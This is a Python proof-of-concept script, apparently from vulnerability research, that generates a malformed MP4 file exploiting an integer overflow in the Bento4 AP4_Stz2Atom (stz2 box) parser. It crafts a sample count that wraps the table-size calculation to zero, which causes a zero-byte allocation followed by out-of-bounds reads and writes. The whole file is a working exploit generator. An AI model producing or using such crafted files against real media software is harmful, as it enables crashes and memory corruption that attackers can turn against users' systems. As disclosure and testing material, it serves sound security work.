#!/usr/bin/env python3
"""
PoC generator for VULN 003: AP4_Stz2Atom integer overflow
table_size = (sample_count * m_FieldSize + 7) / 8
With field_size=16, sample_count=0x10000000:
  0x10000000 * 16 = 0x100000000 -> overflows 32-bit to 0
  table_size = (0 + 7) / 8 = 0 -> 0-byte buffer allocated
  Loop accesses buffer[i*2] for i=0..0x10000000-1 -> OOB
"""

import struct
import os
import sys

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT = os.path.join(POC_DIR, "vuln_003.mp4")

def box(typ, data):
    """Build a box with 4-byte size + 4-byte type + data."""
    if isinstance(typ, str):
        typ = typ.encode('latin-1')
    return struct.pack('>I', len(data) + 8) + typ + data

def fullbox(typ, version, flags, data):
    """Build a FullBox (has version + flags after type)."""
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(typ, vf + data)

# -----------------------------------------------------------------------
# ftyp box
# -----------------------------------------------------------------------
ftyp_data = (
    b'isom'           # major brand
    + struct.pack('>I', 0)  # minor version
    + b'isom'         # compatible brand
)
ftyp = box('ftyp', ftyp_data)

# -----------------------------------------------------------------------
# stz2 box – the malicious box
# field_size = 16, sample_count = 0x10000000
# table_size = (0x10000000 * 16 + 7) / 8 overflows to 0
# -----------------------------------------------------------------------
FIELD_SIZE_16   = 16
SAMPLE_COUNT    = 0x10000000

stz2_body = (
    b'\x00\x00\x00'                      # reserved (3 bytes)
    + struct.pack('>B', FIELD_SIZE_16)   # field_size (1 byte) = 16
    + struct.pack('>I', SAMPLE_COUNT)    # sample_count (4 bytes BE)
    # No entry data — table_size == 0 so alloc is 0 bytes,
    # check (0+8) > 20 is false, parse proceeds with 0 entries in buffer
)
stz2 = fullbox('stz2', 0, 0, stz2_body)

# -----------------------------------------------------------------------
# Stub boxes required so the parser reaches stz2
# -----------------------------------------------------------------------
# stsd: sample description table (minimal)
stsd = fullbox('stsd', 0, 0, struct.pack('>I', 0))  # entry_count = 0

# stts: time-to-sample (minimal)
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))  # entry_count = 0

# stsc: sample-to-chunk (minimal)
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))

# stco: chunk offset (minimal)
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))

# stbl: sample table
stbl = box('stbl', stsd + stts + stsc + stco + stz2)

# -----------------------------------------------------------------------
# smhd: sound media header
# -----------------------------------------------------------------------
smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))  # balance + reserved

# -----------------------------------------------------------------------
# dinf / dref
# -----------------------------------------------------------------------
# url box inside dref
url_box = fullbox('url ', 0, 1, b'')   # flags=1 means self-contained
dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_box)
dinf = box('dinf', dref)

# -----------------------------------------------------------------------
# minf: media information
# -----------------------------------------------------------------------
minf = box('minf', smhd + dinf + stbl)

# -----------------------------------------------------------------------
# mdhd: media header
# -----------------------------------------------------------------------
mdhd_data = (
    struct.pack('>I', 0)   # creation_time
    + struct.pack('>I', 0) # modification_time
    + struct.pack('>I', 44100)  # timescale
    + struct.pack('>I', 0) # duration
    + struct.pack('>HH', 0x0000, 0)  # language, pre_defined
)
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# -----------------------------------------------------------------------
# hdlr: handler reference
# -----------------------------------------------------------------------
hdlr_data = (
    struct.pack('>I', 0)   # pre_defined
    + b'soun'              # handler_type
    + struct.pack('>III', 0, 0, 0)  # reserved
    + b'\x00'              # name (null string)
)
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# -----------------------------------------------------------------------
# mdia: media
# -----------------------------------------------------------------------
mdia = box('mdia', mdhd + hdlr + minf)

# -----------------------------------------------------------------------
# tkhd: track header (version 0 = 92 bytes total)
# -----------------------------------------------------------------------
tkhd_data = (
    struct.pack('>I', 0)    # creation_time
    + struct.pack('>I', 0)  # modification_time
    + struct.pack('>I', 1)  # track_id
    + struct.pack('>I', 0)  # reserved
    + struct.pack('>I', 0)  # duration
    + struct.pack('>II', 0, 0)  # reserved2 (8 bytes)
    + struct.pack('>hh', 0, 0)  # layer, alternate_group
    + struct.pack('>H', 0x0100) # volume (1.0)
    + struct.pack('>H', 0)      # reserved3
    # Unity matrix (9 x 4 bytes = 36 bytes)
    + struct.pack('>lllllllll',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    + struct.pack('>II', 0, 0)  # width, height
)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)  # flags=3: enabled+in_movie

# -----------------------------------------------------------------------
# trak: track
# -----------------------------------------------------------------------
trak = box('trak', tkhd + mdia)

# -----------------------------------------------------------------------
# mvhd: movie header (version 0)
# -----------------------------------------------------------------------
mvhd_data = (
    struct.pack('>I', 0)       # creation_time
    + struct.pack('>I', 0)     # modification_time
    + struct.pack('>I', 1000)  # timescale
    + struct.pack('>I', 0)     # duration
    + struct.pack('>I', 0x00010000)  # rate (1.0)
    + struct.pack('>H', 0x0100)      # volume (1.0)
    + struct.pack('>H', 0)           # reserved
    + struct.pack('>II', 0, 0)       # reserved
    # Unity matrix (36 bytes)
    + struct.pack('>lllllllll',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    + struct.pack('>IIIIIIII', 0, 0, 0, 0, 0, 0, 0, 0)  # pre_defined[6] + reserved (2)
    + struct.pack('>I', 0xFFFFFFFF)  # next_track_id
)
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# -----------------------------------------------------------------------
# moov: movie
# -----------------------------------------------------------------------
moov = box('moov', mvhd + trak)

# -----------------------------------------------------------------------
# Write the file
# -----------------------------------------------------------------------
mp4_bytes = ftyp + moov

with open(OUTPUT, 'wb') as f:
    f.write(mp4_bytes)

print(f"[+] Written {len(mp4_bytes)} bytes to {OUTPUT}")
print(f"[+] stz2: field_size={FIELD_SIZE_16}, sample_count=0x{SAMPLE_COUNT:08x}")
print(f"[+] Integer overflow: 0x{SAMPLE_COUNT:x} * {FIELD_SIZE_16} = 0x{(SAMPLE_COUNT * FIELD_SIZE_16) & 0xFFFFFFFF:x} (overflows to 0)")
print(f"[+] table_size = (0 + 7) / 8 = 0 -> 0-byte alloc, OOB read/write on loop")
